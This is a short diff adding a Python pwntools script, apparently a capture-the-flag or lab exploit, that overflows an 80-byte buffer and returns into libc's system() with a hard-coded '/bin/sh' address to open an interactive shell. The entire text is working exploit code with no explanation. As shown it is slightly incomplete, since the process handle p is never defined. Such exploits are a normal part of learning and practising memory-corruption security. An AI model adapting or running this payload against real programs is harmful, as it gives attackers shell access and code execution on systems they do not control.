@@ -1,0 +1,8 @@
+from pwn import *
+system = p32(0xf7e117e0)
+dummy = p32(0xFFFFFFFF)
+bin_sh = p32(0xf7f50968)
+offset = 80
+payload = b'A'*offset + system  + dummy + bin_sh
+p.sendline(payload)
+p.interactive()
